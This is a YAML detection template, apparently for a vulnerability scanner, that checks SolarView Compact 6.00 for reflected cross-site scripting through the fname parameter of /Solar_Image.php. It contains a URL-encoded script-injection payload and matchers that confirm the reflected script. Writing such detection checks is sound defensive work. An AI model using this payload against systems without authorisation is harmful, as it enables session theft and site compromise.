id: solarview-compact-xss
name: SolarView Compact 6.00 - Cross-Site Scripting
severity: high
confidence: confirmed
description: SolarView Compact 6.00 contains a cross-site scripting vulnerability via fname at /Solar_Image.php.
reference: CWE-79
tags:
- xss
- solarview
- edb
- vuln
requests:
- method: GET
  path: /Solar_Image.php?mode=resize&fname=test%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
  matchers:
  - type: body
    words:
    - value="test"><script>alert(document.domain)</script>">
  - type: header
    words:
    - text/html
  - type: status
    status:
    - 200
  condition: and
